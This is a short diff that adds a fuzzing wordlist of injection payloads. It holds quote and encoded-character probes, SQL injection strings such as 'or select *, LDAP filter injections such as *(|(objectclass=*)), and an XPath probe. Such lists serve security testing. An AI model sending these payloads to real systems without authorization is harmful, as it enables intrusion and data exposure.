@@ -1,0 +1,19 @@
+'
+"
+'%20
+'%20;
+=%20'
+=%20;
+\x23
+\x27
+%27
+\x3D%20\x3B'
+\x3D%20\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or%20select *
+'%20or%20''='
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+//*
